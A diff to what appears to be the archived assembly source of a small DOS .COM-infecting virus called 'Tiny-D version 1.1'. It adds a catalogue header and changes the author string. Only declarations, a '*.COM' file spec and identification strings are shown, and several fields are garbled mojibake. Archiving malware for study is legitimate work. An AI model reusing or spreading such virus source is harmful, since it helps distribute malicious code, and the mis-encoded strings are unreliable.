@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      T
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 tinyv   SEGMENT BYTE PUBLIC 'code'
         ASSUME  CS:tinyv
         ASSUME  SS:tinyv
@@ -110,7 +121,7 @@ fspec   LABEL   WORD
         DB      '*.COM'
 	DB	0
 nondata DB      'Tiny-D version 1.1$   '; Program identification
-nondat2 DB      ' by ˜€×@&î·³½ë$'     ; author identification
+nondat2 DB      ' by ï¿½ï¿½ï¿½@&î·³ï¿½ï¿½$'     ; author identification
 endprog LABEL   WORD
 tinyv   ENDS
         END     program
